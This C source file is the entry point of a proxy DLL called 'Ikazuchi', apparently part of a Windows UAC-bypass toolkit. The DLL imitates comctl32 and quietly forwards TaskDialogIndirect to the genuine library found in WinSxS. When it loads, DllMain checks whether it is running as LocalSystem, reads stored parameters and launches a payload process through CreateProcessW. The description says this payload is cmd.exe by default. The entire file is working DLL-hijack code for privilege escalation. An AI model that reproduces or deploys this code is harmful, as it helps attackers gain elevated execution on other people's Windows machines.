/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2017
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     2.80
*
*  DATE:        06 Sept 2017
*
*  Proxy dll entry point, Ikazuchi.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u

#include <windows.h>
#include "shared\ntos.h"
#include <ntstatus.h>
#include "shared\minirtl.h"
#include "shared\_filename.h"
#include "shared\util.h"

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define LoadedMsg      TEXT("Ikazuchi lock and loaded")

#define T_SXS_DIRECTORY         L"\\\\?\\globalroot\\systemroot\\winsxs\\"
#define SXS_DIRECTORY_LENGTH    sizeof(T_SXS_DIRECTORY) - sizeof(WCHAR)

#define T_COMCTL32_SLASH        L"\\comctl32.dll"
#define COMCTL32_SLASH_LENGTH   sizeof(T_COMCTL32_SLASH) - sizeof(WCHAR)

#define COMCTL32_SXS            L"microsoft.windows.common-controls"
#define COMCTL32_DLL            L"comctl32.dll"

typedef HRESULT(WINAPI *pfnTaskDialogIndirect)(
    VOID *pTaskConfig,
    int  *pnButton,
    int  *pnRadioButton,
    BOOL *pfVerificationFlagChecked
    );

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{
}

/*
* TaskDialogIndirectForward
*
* Purpose:
*
* Forward to comctl32!TaskDialogIndirect. We can drop it btw, its not needed.
*
*/
HRESULT WINAPI TaskDialogIndirectForward(
    VOID *pTaskConfig,
    int  *pnButton,
    int  *pnRadioButton,
    BOOL *pfVerificationFlagChecked
)
{
    BOOL     bCond = FALSE;
    WCHAR   *lpszFullDllPath = NULL, *lpszDirectoryName = NULL;
    LPWSTR   lpSxsPath = NULL;
    SIZE_T   sz;

    PVOID           hLib = NULL;
    UNICODE_STRING  DllName;
    ANSI_STRING     RoutineName;
    NTSTATUS        status;

    pfnTaskDialogIndirect   realFunc;
    SXS_SEARCH_CONTEXT      sctx;

    HRESULT hr = E_NOTIMPL;

    do {

        sz = UNICODE_STRING_MAX_BYTES;
        NtAllocateVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (lpszFullDllPath == NULL)
            break;

        sctx.DllName = COMCTL32_DLL;
        sctx.PartialPath = COMCTL32_SXS;
        sctx.FullDllPath = lpszFullDllPath;

        if (!NT_SUCCESS(LdrEnumerateLoadedModules(0, &sxsFindDllCallback, (PVOID)&sctx)))
            break;

        lpszDirectoryName = _filename(lpszFullDllPath);
        if (lpszDirectoryName == NULL)
            break;

        sz = SXS_DIRECTORY_LENGTH + COMCTL32_SLASH_LENGTH + ((1 + _strlen(lpszDirectoryName)) * sizeof(WCHAR));
        NtAllocateVirtualMemory(NtCurrentProcess(), &lpSxsPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (lpSxsPath == NULL)
            break;

        _strcpy(lpSxsPath, T_SXS_DIRECTORY);
        _strcat(lpSxsPath, lpszDirectoryName);
        _strcat(lpSxsPath, T_COMCTL32_SLASH);

        DllName.Buffer = NULL;
        DllName.Length = 0;
        DllName.MaximumLength = 0;
        RtlInitUnicodeString(&DllName, lpSxsPath);
        if (NT_SUCCESS(LdrLoadDll(NULL, NULL, &DllName, &hLib))) {
            if (hLib) {
                realFunc = NULL;
                RtlInitString(&RoutineName, "TaskDialogIndirect");
                status = LdrGetProcedureAddress(hLib, &RoutineName, 0, (PVOID *)&realFunc);
                if ((NT_SUCCESS(status)) && (realFunc != NULL)) {
                    hr = realFunc(pTaskConfig, pnButton, pnRadioButton, pfVerificationFlagChecked);
                }
            }
        }

    } while (bCond);

    if (lpszFullDllPath) {
        sz = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &lpszFullDllPath, &sz, MEM_RELEASE);
    }

    if (lpSxsPath) {
        sz = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &lpSxsPath, &sz, MEM_RELEASE);
    }

    return hr;
}

/*
* DllMain
*
* Purpose:
*
* Proxy dll entry point, start cmd.exe and exit immediatelly.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    BOOL bReadSuccess, bIsLocalSystem = FALSE;
    PWSTR lpParameter = NULL;
    ULONG cbParameter = 0L;

    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH) {

        OutputDebugString(LoadedMsg);

        ucmIsLocalSystem(&bIsLocalSystem);

        bReadSuccess = ucmReadParameters(
            &lpParameter,
            &cbParameter,
            NULL,
            NULL,
            bIsLocalSystem);

        ucmLaunchPayloadEx(
            CreateProcessW,
            lpParameter,
            cbParameter);

        if ((bReadSuccess) &&
            (lpParameter != NULL))
        {
            RtlFreeHeap(
                NtCurrentPeb()->ProcessHeap,
                0,
                lpParameter);
        }

    }
    return TRUE;
}
